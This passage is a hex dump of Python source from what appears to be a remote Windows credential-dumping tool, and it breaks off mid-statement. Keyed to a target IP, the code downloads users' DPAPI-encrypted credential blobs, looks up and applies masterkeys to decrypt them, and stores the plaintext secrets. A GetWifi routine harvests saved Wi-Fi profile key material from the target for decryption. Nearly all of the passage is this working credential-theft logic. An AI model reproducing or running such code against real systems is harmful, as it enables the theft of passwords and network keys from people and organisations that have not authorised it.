+00009e00: 726e 616d 6529 2c20 6d79 5f64 6972 290a  rname), my_dir).
+00009e10: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
+00009e20: 2e64 6562 7567 280a 0909 0909 0966 225b  .debug(......f"[
+00009e30: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
+00009e40: 7267 6574 5f69 707d 5d20 4c6f 6f6b 696e  rget_ip}] Lookin
+00009e50: 6720 666f 7220 7b75 7365 722e 7573 6572  g for {user.user
+00009e60: 6e61 6d65 7d20 6669 6c65 7320 696e 207b  name} files in {
+00009e70: 746d 705f 7077 647d 2077 6974 6820 6d61  tmp_pwd} with ma
+00009e80: 736b 207b 6d79 5f6d 6173 6b7d 2229 0a09  sk {my_mask}")..
+00009e90: 0909 096d 795f 6469 7265 6374 6f72 7920  ...my_directory 
+00009ea0: 3d20 7365 6c66 2e6d 7966 696c 656f 7073  = self.myfileops
+00009eb0: 2e64 6f5f 6c73 2874 6d70 5f70 7764 2c20  .do_ls(tmp_pwd, 
+00009ec0: 6d79 5f6d 6173 6b2c 2064 6973 706c 6179  my_mask, display
+00009ed0: 3d46 616c 7365 290a 0909 0909 666f 7220  =False).....for 
+00009ee0: 696e 666f 7320 696e 206d 795f 6469 7265  infos in my_dire
+00009ef0: 6374 6f72 793a 0a09 0909 0909 6c6f 6e67  ctory:......long
+00009f00: 6e61 6d65 2c20 6973 5f64 6972 6563 746f  name, is_directo
+00009f10: 7279 203d 2069 6e66 6f73 0a09 0909 0909  ry = infos......
+00009f20: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+00009f30: 7567 2822 6c73 2072 6574 7572 6e65 6420  ug("ls returned 
+00009f40: 6669 6c65 2025 7322 2025 206c 6f6e 676e  file %s" % longn
+00009f50: 616d 6529 0a09 0909 0909 6966 206c 6f6e  ame)......if lon
+00009f60: 676e 616d 6520 6e6f 7420 696e 2062 6c61  gname not in bla
+00009f70: 636b 6c69 7374 2061 6e64 206e 6f74 2069  cklist and not i
+00009f80: 735f 6469 7265 6374 6f72 793a 0a09 0909  s_directory:....
+00009f90: 0909 0974 7279 3a0a 0909 0909 0909 0973  ...try:........s
+00009fa0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+00009fb0: 6728 0a09 0909 0909 0909 0966 225b 7b73  g(.........f"[{s
+00009fc0: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
+00009fd0: 6574 5f69 707d 5d20 5b2b 5d20 466f 756e  et_ip}] [+] Foun
+00009fe0: 6420 7b62 636f 6c6f 7273 2e4f 4b42 4c55  d {bcolors.OKBLU
+00009ff0: 457d 7b75 7365 722e 7573 6572 6e61 6d65  E}{user.username
+0000a000: 7d7b 6263 6f6c 6f72 732e 454e 4443 7d20  }{bcolors.ENDC} 
+0000a010: 656e 6372 7970 7465 6420 6669 6c65 7320  encrypted files 
+0000a020: 7b6c 6f6e 676e 616d 657d 2229 0a09 0909  {longname}")....
+0000a030: 0909 0909 2320 446f 776e 6c6f 6164 696e  ....# Downloadin
+0000a040: 6720 426c 6f62 2066 696c 650a 0909 0909  g Blob file.....
+0000a050: 0909 096c 6f63 616c 6669 6c65 203d 2073  ...localfile = s
+0000a060: 656c 662e 6d79 6669 6c65 6f70 732e 6765  elf.myfileops.ge
+0000a070: 745f 6669 6c65 286e 7470 6174 682e 6a6f  t_file(ntpath.jo
+0000a080: 696e 2874 6d70 5f70 7764 2c20 6c6f 6e67  in(tmp_pwd, long
+0000a090: 6e61 6d65 2929 0a09 0909 0909 0909 7573  name))........us
+0000a0a0: 6572 2e66 696c 6573 5b6c 6f6e 676e 616d  er.files[longnam
+0000a0b0: 655d 203d 207b 7d0a 0909 0909 0909 0975  e] = {}........u
+0000a0c0: 7365 722e 6669 6c65 735b 6c6f 6e67 6e61  ser.files[longna
+0000a0d0: 6d65 5d5b 2774 7970 6527 5d20 3d20 6d79  me]['type'] = my
+0000a0e0: 5f62 6c6f 625f 7479 7065 0a09 0909 0909  _blob_type......
+0000a0f0: 0909 7573 6572 2e66 696c 6573 5b6c 6f6e  ..user.files[lon
+0000a100: 676e 616d 655d 5b27 7374 6174 7573 275d  gname]['status']
+0000a110: 203d 2027 656e 6372 7970 7465 6427 0a09   = 'encrypted'..
+0000a120: 0909 0909 0909 7573 6572 2e66 696c 6573  ......user.files
+0000a130: 5b6c 6f6e 676e 616d 655d 5b27 7061 7468  [longname]['path
+0000a140: 275d 203d 206c 6f63 616c 6669 6c65 0a0a  '] = localfile..
+0000a150: 0909 0909 0909 096d 796f 7074 696f 6e73  .......myoptions
+0000a160: 203d 2063 6f70 792e 6465 6570 636f 7079   = copy.deepcopy
+0000a170: 2873 656c 662e 6f70 7469 6f6e 7329 0a09  (self.options)..
+0000a180: 0909 0909 0909 6d79 6f70 7469 6f6e 732e  ......myoptions.
+0000a190: 6669 6c65 203d 206c 6f63 616c 6669 6c65  file = localfile
+0000a1a0: 2020 2320 4d61 7374 6572 6b65 7966 696c    # Masterkeyfil
+0000a1b0: 6520 746f 2070 6172 7365 0a09 0909 0909  e to parse......
+0000a1c0: 0909 6d79 6f70 7469 6f6e 732e 6d61 7374  ..myoptions.mast
+0000a1d0: 6572 6b65 7973 203d 204e 6f6e 6520 2023  erkeys = None  #
+0000a1e0: 2075 7365 722e 6d61 7374 6572 6b65 7973   user.masterkeys
+0000a1f0: 5f66 696c 650a 0909 0909 0909 096d 796f  _file........myo
+0000a200: 7074 696f 6e73 2e6b 6579 203d 204e 6f6e  ptions.key = Non
+0000a210: 650a 0909 0909 0909 096d 7964 7061 7069  e........mydpapi
+0000a220: 203d 2044 5041 5049 286d 796f 7074 696f   = DPAPI(myoptio
+0000a230: 6e73 2c20 7365 6c66 2e6c 6f67 6769 6e67  ns, self.logging
+0000a240: 290a 0909 0909 0909 0967 7569 6420 3d20  )........guid = 
+0000a250: 6d79 6470 6170 692e 6669 6e64 5f43 7265  mydpapi.find_Cre
+0000a260: 6465 6e74 6961 6c46 696c 655f 6d61 7374  dentialFile_mast
+0000a270: 6572 6b65 7928 290a 0909 0909 0909 0973  erkey()........s
+0000a280: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+0000a290: 6728 6622 5b7b 7365 6c66 2e6f 7074 696f  g(f"[{self.optio
+0000a2a0: 6e73 2e74 6172 6765 745f 6970 7d5d 204c  ns.target_ip}] L
+0000a2b0: 6f6f 6b69 6e67 2066 6f72 207b 6c6f 6e67  ooking for {long
+0000a2c0: 6e61 6d65 7d20 6d61 7374 6572 6b65 7920  name} masterkey 
+0000a2d0: 3a20 7b67 7569 647d 2229 0a09 0909 0909  : {guid}")......
+0000a2e0: 0909 6966 2067 7569 6420 213d 204e 6f6e  ..if guid != Non
+0000a2f0: 653a 0a09 0909 0909 0909 096d 6173 7465  e:.........maste
+0000a300: 726b 6579 203d 2073 656c 662e 6765 745f  rkey = self.get_
+0000a310: 6d61 7374 6572 6b65 7928 7573 6572 3d75  masterkey(user=u
+0000a320: 7365 722c 2067 7569 643d 6775 6964 2c20  ser, guid=guid, 
+0000a330: 7479 7065 3d6d 795f 7573 6572 5f74 7970  type=my_user_typ
+0000a340: 6529 0a09 0909 0909 0909 0969 6620 6d61  e).........if ma
+0000a350: 7374 6572 6b65 7920 213d 204e 6f6e 653a  sterkey != None:
+0000a360: 0a09 0909 0909 0909 0909 6966 206d 6173  ..........if mas
+0000a370: 7465 726b 6579 5b27 7374 6174 7573 275d  terkey['status']
+0000a380: 203d 3d20 2764 6563 7279 7074 6564 273a   == 'decrypted':
+0000a390: 0a09 0909 0909 0909 0909 096d 7964 7061  ...........mydpa
+0000a3a0: 7069 2e6f 7074 696f 6e73 2e6b 6579 203d  pi.options.key =
+0000a3b0: 206d 6173 7465 726b 6579 5b27 6b65 7927   masterkey['key'
+0000a3c0: 5d0a 0909 0909 0909 0909 0909 6372 6564  ]...........cred
+0000a3d0: 5f64 6174 6120 3d20 6d79 6470 6170 692e  _data = mydpapi.
+0000a3e0: 6465 6372 7970 745f 6372 6564 656e 7469  decrypt_credenti
+0000a3f0: 616c 2829 0a09 0909 0909 0909 0909 0969  al()...........i
+0000a400: 6620 6372 6564 5f64 6174 6120 213d 204e  f cred_data != N
+0000a410: 6f6e 653a 0a09 0909 0909 0909 0909 0909  one:............
+0000a420: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+0000a430: 7567 280a 0909 0909 0909 0909 0909 0909  ug(.............
+0000a440: 6622 5b7b 7365 6c66 2e6f 7074 696f 6e73  f"[{self.options
+0000a450: 2e74 6172 6765 745f 6970 7d5d 207b 6263  .target_ip}] {bc
+0000a460: 6f6c 6f72 732e 4f4b 4752 4545 4e7d 4465  olors.OKGREEN}De
+0000a470: 6372 7970 7469 6f6e 2073 7563 6365 7373  cryption success
+0000a480: 6675 6c6c 206f 6620 7b62 636f 6c6f 7273  full of {bcolors
+0000a490: 2e4f 4b42 4c55 457d 7b75 7365 722e 7573  .OKBLUE}{user.us
+0000a4a0: 6572 6e61 6d65 7d7b 6263 6f6c 6f72 732e  ername}{bcolors.
+0000a4b0: 454e 4443 7d20 5365 6372 6574 207b 6c6f  ENDC} Secret {lo
+0000a4c0: 6e67 6e61 6d65 7d7b 6263 6f6c 6f72 732e  ngname}{bcolors.
+0000a4d0: 454e 4443 7d22 290a 0909 0909 0909 0909  ENDC}").........
+0000a4e0: 0909 0975 7365 722e 6669 6c65 735b 6c6f  ...user.files[lo
+0000a4f0: 6e67 6e61 6d65 5d5b 2773 7461 7475 7327  ngname]['status'
+0000a500: 5d20 3d20 2764 6563 7279 7074 6564 270a  ] = 'decrypted'.
+0000a510: 0909 0909 0909 0909 0909 0975 7365 722e  ...........user.
+0000a520: 6669 6c65 735b 6c6f 6e67 6e61 6d65 5d5b  files[longname][
+0000a530: 2764 6174 6127 5d20 3d20 6372 6564 5f64  'data'] = cred_d
+0000a540: 6174 610a 0909 0909 0909 0909 0909 0973  ata............s
+0000a550: 656c 662e 7072 6f63 6573 735f 6465 6372  elf.process_decr
+0000a560: 7970 7465 645f 6461 7461 2875 7365 722c  ypted_data(user,
+0000a570: 2075 7365 722e 6669 6c65 735b 0a09 0909   user.files[....
+0000a580: 0909 0909 0909 0909 096c 6f6e 676e 616d  .........longnam
+0000a590: 655d 2920 2023 2063 7265 645f 6461 7461  e])  # cred_data
+0000a5a0: 2c75 7365 722c 6c6f 6361 6c66 696c 652c  ,user,localfile,
+0000a5b0: 6d79 5f62 6c6f 625f 7479 7065 290a 0909  my_blob_type)...
+0000a5c0: 0909 0909 0909 0909 656c 7365 3a0a 0909  ........else:...
+0000a5d0: 0909 0909 0909 0909 0973 656c 662e 6c6f  .........self.lo
+0000a5e0: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
+0000a5f0: 0909 0909 0909 0909 0966 225b 7b73 656c  .........f"[{sel
+0000a600: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
+0000a610: 5f69 707d 5d20 7b62 636f 6c6f 7273 2e57  _ip}] {bcolors.W
+0000a620: 4152 4e49 4e47 7d45 7272 6f72 2064 6563  ARNING}Error dec
+0000a630: 7279 7074 696e 6720 426c 6f62 2066 6f72  rypting Blob for
+0000a640: 207b 6c6f 6361 6c66 696c 657d 2077 6974   {localfile} wit
+0000a650: 6820 4d61 7374 6572 6b65 797b 6263 6f6c  h Masterkey{bcol
+0000a660: 6f72 732e 454e 4443 7d22 290a 0909 0909  ors.ENDC}").....
+0000a670: 0909 0909 0965 6c73 653a 0a09 0909 0909  .....else:......
+0000a680: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
+0000a690: 672e 6465 6275 6728 0a09 0909 0909 0909  g.debug(........
+0000a6a0: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
+0000a6b0: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
+0000a6c0: 207b 6263 6f6c 6f72 732e 5741 524e 494e   {bcolors.WARNIN
+0000a6d0: 477d 4572 726f 7220 6465 6372 7970 7469  G}Error decrypti
+0000a6e0: 6e67 2042 6c6f 6220 666f 7220 7b6c 6f63  ng Blob for {loc
+0000a6f0: 616c 6669 6c65 7d20 7769 7468 204d 6173  alfile} with Mas
+0000a700: 7465 726b 6579 202d 204d 6173 7465 726b  terkey - Masterk
+0000a710: 6579 206e 6f74 2064 6563 7279 7074 6564  ey not decrypted
+0000a720: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
+0000a730: 0a09 0909 0909 0909 0965 6c73 653a 0a09  .........else:..
+0000a740: 0909 0909 0909 0909 7365 6c66 2e6c 6f67  ........self.log
+0000a750: 6769 6e67 2e64 6562 7567 280a 0909 0909  ging.debug(.....
+0000a760: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
+0000a770: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
+0000a780: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
+0000a790: 494e 477d 4572 726f 7220 6465 6372 7970  ING}Error decryp
+0000a7a0: 7469 6e67 2042 6c6f 6220 666f 7220 7b6c  ting Blob for {l
+0000a7b0: 6f63 616c 6669 6c65 7d20 7769 7468 204d  ocalfile} with M
+0000a7c0: 6173 7465 726b 6579 2d20 6361 6e74 2067  asterkey- cant g
+0000a7d0: 6574 206d 6173 7465 726b 6579 207b 6775  et masterkey {gu
+0000a7e0: 6964 7d7b 6263 6f6c 6f72 732e 454e 4443  id}{bcolors.ENDC
+0000a7f0: 7d22 290a 0909 0909 0909 0965 6c73 653a  }")........else:
+0000a800: 0a09 0909 0909 0909 0973 656c 662e 6c6f  .........self.lo
+0000a810: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
+0000a820: 0909 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
+0000a830: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
+0000a840: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
+0000a850: 494e 477d 4572 726f 7220 6465 6372 7970  ING}Error decryp
+0000a860: 7469 6e67 2042 6c6f 6220 666f 7220 7b6c  ting Blob for {l
+0000a870: 6f63 616c 6669 6c65 7d20 7769 7468 204d  ocalfile} with M
+0000a880: 6173 7465 726b 6579 202d 2063 616e 2074  asterkey - can t
+0000a890: 2067 6574 2074 6865 2047 5549 4420 6f66   get the GUID of
+0000a8a0: 206d 6173 7465 726b 6579 2066 726f 6d20   masterkey from 
+0000a8b0: 626c 6f62 2066 696c 657b 6263 6f6c 6f72  blob file{bcolor
+0000a8c0: 732e 454e 4443 7d22 290a 0909 0909 0909  s.ENDC}").......
+0000a8d0: 6578 6365 7074 2045 7863 6570 7469 6f6e  except Exception
+0000a8e0: 2061 7320 6578 3a0a 0909 0909 0909 0973   as ex:........s
+0000a8f0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+0000a900: 6728 0a09 0909 0909 0909 0966 225b 7b73  g(.........f"[{s
+0000a910: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
+0000a920: 6574 5f69 707d 5d20 7b62 636f 6c6f 7273  et_ip}] {bcolors
+0000a930: 2e57 4152 4e49 4e47 7d45 7863 6570 7469  .WARNING}Excepti
+0000a940: 6f6e 2064 6563 7279 7074 696e 6720 426c  on decrypting Bl
+0000a950: 6f62 2066 6f72 207b 6c6f 6361 6c66 696c  ob for {localfil
+0000a960: 657d 2077 6974 6820 4d61 7374 6572 6b65  e} with Masterke
+0000a970: 797b 6263 6f6c 6f72 732e 454e 4443 7d22  y{bcolors.ENDC}"
+0000a980: 290a 0909 0909 0909 0973 656c 662e 6c6f  )........self.lo
+0000a990: 6767 696e 672e 6465 6275 6728 6578 290a  gging.debug(ex).
+0000a9a0: 0909 7265 7475 726e 2031 0a0a 0964 6566  ..return 1...def
+0000a9b0: 2047 6574 5769 6669 2873 656c 6629 3a0a   GetWifi(self):.
+0000a9c0: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e69  ..self.logging.i
+0000a9d0: 6e66 6f28 6622 5b7b 7365 6c66 2e6f 7074  nfo(f"[{self.opt
+0000a9e0: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
+0000a9f0: 207b 6263 6f6c 6f72 732e 4f4b 424c 5545   {bcolors.OKBLUE
+0000aa00: 7d5b 2b5d 2047 6174 6865 7269 6e67 2057  }[+] Gathering W
+0000aa10: 6966 6920 4b65 7973 7b62 636f 6c6f 7273  ifi Keys{bcolors
+0000aa20: 2e45 4e44 437d 2229 0a09 0962 6c61 636b  .ENDC}")...black
+0000aa30: 6c69 7374 203d 205b 272e 272c 2027 2e2e  list = ['.', '..
+0000aa40: 275d 0a09 096d 6163 6869 6e65 5f64 6972  ']...machine_dir
+0000aa50: 6563 746f 7269 6573 203d 205b 2822 5072  ectories = [("Pr
+0000aa60: 6f67 7261 6d44 6174 615c 5c4d 6963 726f  ogramData\\Micro
+0000aa70: 736f 6674 5c5c 576c 616e 7376 635c 5c50  soft\\Wlansvc\\P
+0000aa80: 726f 6669 6c65 735c 5c49 6e74 6572 6661  rofiles\\Interfa
+0000aa90: 6365 7322 2c20 272a 2e78 6d6c 2729 5d0a  ces", '*.xml')].
+0000aaa0: 0a09 0966 6f72 2069 6e66 6f20 696e 206d  ...for info in m
+0000aab0: 6163 6869 6e65 5f64 6972 6563 746f 7269  achine_directori
+0000aac0: 6573 3a0a 0909 0975 7365 7220 3d20 7365  es:....user = se
+0000aad0: 6c66 2e47 6574 5573 6572 4279 4e61 6d65  lf.GetUserByName
+0000aae0: 2827 4d41 4348 494e 4524 2729 0a09 0909  ('MACHINE$')....
+0000aaf0: 6d79 5f64 6972 2c20 6d79 5f6d 6173 6b20  my_dir, my_mask 
+0000ab00: 3d20 696e 666f 0a09 0909 2320 696e 7465  = info....# inte
+0000ab10: 7266 6163 6520 6e61 6d65 0a09 0909 7365  rface name....se
+0000ab20: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
+0000ab30: 2866 225b 7b73 656c 662e 6f70 7469 6f6e  (f"[{self.option
+0000ab40: 732e 7461 7267 6574 5f69 707d 5d20 5b2b  s.target_ip}] [+
+0000ab50: 5d20 4c6f 6f6b 696e 6720 666f 7220 696e  ] Looking for in
+0000ab60: 7465 7266 6163 6573 2069 6e20 7b6d 795f  terfaces in {my_
+0000ab70: 6469 727d 2229 2020 2320 4e6f 206d 6173  dir}")  # No mas
+0000ab80: 6b0a 0909 096d 795f 6469 7265 6374 6f72  k....my_director
+0000ab90: 7920 3d20 7365 6c66 2e6d 7966 696c 656f  y = self.myfileo
+0000aba0: 7073 2e64 6f5f 6c73 286d 795f 6469 722c  ps.do_ls(my_dir,
+0000abb0: 2027 2a27 2c20 6469 7370 6c61 793d 4661   '*', display=Fa
+0000abc0: 6c73 6529 0a09 0909 666f 7220 696e 666f  lse)....for info
+0000abd0: 7320 696e 206d 795f 6469 7265 6374 6f72  s in my_director
+0000abe0: 793a 0a09 0909 096c 6f6e 676e 616d 652c  y:.....longname,
+0000abf0: 2069 735f 6469 7265 6374 6f72 7920 3d20   is_directory = 
+0000ac00: 696e 666f 730a 0909 0909 6966 206c 6f6e  infos.....if lon
+0000ac10: 676e 616d 6520 6e6f 7420 696e 2062 6c61  gname not in bla
+0000ac20: 636b 6c69 7374 2061 6e64 2069 735f 6469  cklist and is_di
+0000ac30: 7265 6374 6f72 793a 0a09 0909 0909 7365  rectory:......se
+0000ac40: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
+0000ac50: 2866 225b 7b73 656c 662e 6f70 7469 6f6e  (f"[{self.option
+0000ac60: 732e 7461 7267 6574 5f69 707d 5d20 5b2b  s.target_ip}] [+
+0000ac70: 5d20 476f 7420 5769 6669 2069 6e74 6572  ] Got Wifi inter
+0000ac80: 6661 6365 207b 6c6f 6e67 6e61 6d65 7d22  face {longname}"
+0000ac90: 290a 0909 0909 0974 6d70 5f70 7764 203d  )......tmp_pwd =
+0000aca0: 206e 7470 6174 682e 6a6f 696e 286d 795f   ntpath.join(my_
+0000acb0: 6469 722c 206c 6f6e 676e 616d 6529 0a09  dir, longname)..
+0000acc0: 0909 0909 6d79 5f64 6972 6563 746f 7279  ....my_directory
+0000acd0: 3220 3d20 7365 6c66 2e6d 7966 696c 656f  2 = self.myfileo
+0000ace0: 7073 2e64 6f5f 6c73 2874 6d70 5f70 7764  ps.do_ls(tmp_pwd
+0000acf0: 2c20 6d79 5f6d 6173 6b2c 2064 6973 706c  , my_mask, displ
+0000ad00: 6179 3d46 616c 7365 290a 0909 0909 0966  ay=False)......f
+0000ad10: 6f72 2069 6e66 6f73 3220 696e 206d 795f  or infos2 in my_
+0000ad20: 6469 7265 6374 6f72 7932 3a0a 0909 0909  directory2:.....
+0000ad30: 0909 6c6f 6e67 6e61 6d65 322c 2069 735f  ..longname2, is_
+0000ad40: 6469 7265 6374 6f72 7932 203d 2069 6e66  directory2 = inf
+0000ad50: 6f73 320a 0909 0909 0909 6966 206c 6f6e  os2.......if lon
+0000ad60: 676e 616d 6532 206e 6f74 2069 6e20 626c  gname2 not in bl
+0000ad70: 6163 6b6c 6973 7420 616e 6420 6e6f 7420  acklist and not 
+0000ad80: 6973 5f64 6972 6563 746f 7279 323a 0a09  is_directory2:..
+0000ad90: 0909 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
+0000ada0: 6e67 2e64 6562 7567 2866 225b 7b73 656c  ng.debug(f"[{sel
+0000adb0: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
+0000adc0: 5f69 707d 5d20 5b2b 5d20 476f 7420 7769  _ip}] [+] Got wi
+0000add0: 6669 2063 6f6e 6669 6720 6669 6c65 207b  fi config file {
+0000ade0: 6c6f 6e67 6e61 6d65 327d 2229 0a09 0909  longname2}")....
+0000adf0: 0909 0909 2320 446f 776e 6c6f 6164 696e  ....# Downloadin
+0000ae00: 6720 426c 6f62 2066 696c 650a 0909 0909  g Blob file.....
+0000ae10: 0909 096c 6f63 616c 6669 6c65 203d 2073  ...localfile = s
+0000ae20: 656c 662e 6d79 6669 6c65 6f70 732e 6765  elf.myfileops.ge
+0000ae30: 745f 6669 6c65 286e 7470 6174 682e 6a6f  t_file(ntpath.jo
+0000ae40: 696e 2874 6d70 5f70 7764 2c20 6c6f 6e67  in(tmp_pwd, long
+0000ae50: 6e61 6d65 3229 290a 0909 0909 0909 0975  name2))........u
+0000ae60: 7365 722e 6669 6c65 735b 6c6f 6e67 6e61  ser.files[longna
+0000ae70: 6d65 325d 203d 207b 7d0a 0909 0909 0909  me2] = {}.......
+0000ae80: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
+0000ae90: 6e61 6d65 325d 5b27 7479 7065 275d 203d  name2]['type'] =
+0000aea0: 2027 7769 6669 270a 0909 0909 0909 0975   'wifi'........u
+0000aeb0: 7365 722e 6669 6c65 735b 6c6f 6e67 6e61  ser.files[longna
+0000aec0: 6d65 325d 5b27 7374 6174 7573 275d 203d  me2]['status'] =
+0000aed0: 2027 656e 6372 7970 7465 6427 0a09 0909   'encrypted'....
+0000aee0: 0909 0909 7573 6572 2e66 696c 6573 5b6c  ....user.files[l
+0000aef0: 6f6e 676e 616d 6532 5d5b 2770 6174 6827  ongname2]['path'
+0000af00: 5d20 3d20 6c6f 6361 6c66 696c 650a 0a09  ] = localfile...
+0000af10: 0909 0909 0909 7769 7468 206f 7065 6e28  ......with open(
+0000af20: 6c6f 6361 6c66 696c 652c 2027 7262 2729  localfile, 'rb')
+0000af30: 2061 7320 663a 0a09 0909 0909 0909 0974   as f:.........t
+0000af40: 7279 3a0a 0909 0909 0909 0909 0966 696c  ry:..........fil
+0000af50: 655f 6461 7461 203d 2066 2e72 6561 6428  e_data = f.read(
+0000af60: 292e 7265 706c 6163 6528 6227 5c78 3061  ).replace(b'\x0a
+0000af70: 272c 2062 2727 292e 7265 706c 6163 6528  ', b'').replace(
+0000af80: 6227 5c78 3064 272c 2062 2727 290a 0909  b'\x0d', b'')...
+0000af90: 0909 0909 0909 0977 6966 695f 6e61 6d65  .......wifi_name
+0000afa0: 203d 2072 652e 7365 6172 6368 2862 273c   = re.search(b'<
+0000afb0: 6e61 6d65 3e28 5b5e 3c5d 2b29 3c2f 6e61  name>([^<]+)</na
+0000afc0: 6d65 3e27 2c20 6669 6c65 5f64 6174 6129  me>', file_data)
+0000afd0: 0a09 0909 0909 0909 0909 7769 6669 5f6e  ..........wifi_n
+0000afe0: 616d 6520 3d20 7769 6669 5f6e 616d 652e  ame = wifi_name.
+0000aff0: 6772 6f75 7028 3129 0a09 0909 0909 0909  group(1)........
+0000b000: 0909 7573 6572 2e66 696c 6573 5b6c 6f6e  ..user.files[lon
+0000b010: 676e 616d 6532 5d5b 2777 6966 695f 6e61  gname2]['wifi_na
+0000b020: 6d65 275d 203d 2077 6966 695f 6e61 6d65  me'] = wifi_name
+0000b030: 0a09 0909 0909 0909 0909 6b65 795f 6d61  ..........key_ma
+0000b040: 7465 7269 616c 5f72 6520 3d20 7265 2e73  terial_re = re.s
+0000b050: 6561 7263 6828 6227 3c6b 6579 4d61 7465  earch(b'<keyMate
+0000b060: 7269 616c 3e28 5b30 2d39 412d 465d 2b29  rial>([0-9A-F]+)
+0000b070: 3c2f 6b65 794d 6174 6572 6961 6c3e 272c  </keyMaterial>',
+0000b080: 2066 696c 655f 6461 7461 290a 0909 0909   file_data).....
+0000b090: 0909 0909 0969 6620 6e6f 7420 6b65 795f  .....if not key_
+0000b0a0: 6d61 7465 7269 616c 5f72 653a 0a09 0909  material_re:....
+0000b0b0: 0909 0909 0909 0963 6f6e 7469 6e75 650a  .......continue.
+0000b0c0: 0909 0909 0909 0909 096b 6579 5f6d 6174  .........key_mat
+0000b0d0: 6572 6961 6c20 3d20 6b65 795f 6d61 7465  erial = key_mate
+0000b0e0: 7269 616c 5f72 652e 6772 6f75 7028 3129  rial_re.group(1)
+0000b0f0: 0a09 0909 0909 0909 0923 2077 6974 6820  .........# with 
+0000b100: 6f70 656e 2822 6b65 795f 6d61 7465 7269  open("key_materi
+0000b110: 616c 2e74 6d70 222c 2022 7762 2229 2061  al.tmp", "wb") a
+0000b120: 7320 663a 0a09 0909 0909 0909 0923 0966  s f:.........#.f
+0000b130: 2e77 7269 7465 2862 696e 6173 6369 692e  .write(binascii.
+0000b140: 756e 6865 786c 6966 7928 6b65 795f 6d61  unhexlify(key_ma
+0000b150: 7465 7269 616c 2929 0a09 0909 0909 0909  terial))........
+0000b160: 0965 7863 6570 7420 4578 6365 7074 696f  .except Exceptio
+0000b170: 6e20 6173 2065 783a 0a09 0909 0909 0909  n as ex:........
+0000b180: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e65  ..self.logging.e
+0000b190: 7272 6f72 2866 227b 6263 6f6c 6f72 732e  rror(f"{bcolors.
+0000b1a0: 5741 524e 494e 477d 4572 726f 7220 696e  WARNING}Error in
+0000b1b0: 2077 6966 6920 7061 7273 696e 677b 6263   wifi parsing{bc
+0000b1c0: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
+0000b1d0: 0909 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
+0000b1e0: 696e 672e 6465 6275 6728 6578 290a 0a09  ing.debug(ex)...
+0000b1f0: 0909 0909 0909 0974 7279 3a0a 0909 0909  .......try:.....
+0000b200: 0909 0909 096d 796f 7074 696f 6e73 203d  .....myoptions =
+0000b210: 2063 6f70 792e 6465 6570 636f 7079 2873   copy.deepcopy(s
+0000b220: 656c 662e 6f70 7469 6f6e 7329 0a09 0909  elf.options)....
+0000b230: 0909 0909 0909 6d79 6f70 7469 6f6e 732e  ......myoptions.
+0000b240: 6669 6c65 203d 204e 6f6e 6520 2023 2022  file = None  # "
+0000b250: 6b65 795f 6d61 7465 7269 616c 2e74 6d70  key_material.tmp
+0000b260: 2220 2023 2042 4c4f 4220 746f 2070 6172  "  # BLOB to par
+0000b270: 7365 0a09 0909 0909 0909 0909 6d79 6f70  se..........myop
+0000b280: 7469 6f6e 732e 6b65 7920 3d20 4e6f 6e65  tions.key = None
+0000b290: 0a09 0909 0909 0909 0909 6d79 6f70 7469  ..........myopti
+0000b2a0: 6f6e 732e 6d61 7374 6572 6b65 7973 203d  ons.masterkeys =
+0000b2b0: 204e 6f6e 6520 2023 2075 7365 722e 6d61   None  # user.ma
+0000b2c0: 7374 6572 6b65 7973 5f66 696c 650a 0909  sterkeys_file...
+0000b2d0: 0909 0909 0909 096d 7964 7061 7069 203d  .......mydpapi =
+0000b2e0: 2044 5041 5049 286d 796f 7074 696f 6e73   DPAPI(myoptions
+0000b2f0: 2c20 7365 6c66 2e6c 6f67 6769 6e67 290a  , self.logging).
+0000b300: 0909 0909 0909 0909 0967 7569 6420 3d20  .........guid = 
+0000b310: 6d79 6470 6170 692e 6669 6e64 5f42 6c6f  mydpapi.find_Blo
+0000b320: 625f 6d61 7374 6572 6b65 7928 7261 775f  b_masterkey(raw_
+0000b330: 6461 7461 3d62 696e 6173 6369 692e 756e  data=binascii.un
+0000b340: 6865 786c 6966 7928 6b65 795f 6d61 7465  hexlify(key_mate
+0000b350: 7269 616c 2929 0a09 0909 0909 0909 0909  rial))..........
+0000b360: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+0000b370: 7567 280a 0909 0909 0909 0909 0909 6622  ug(...........f"
+0000b380: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
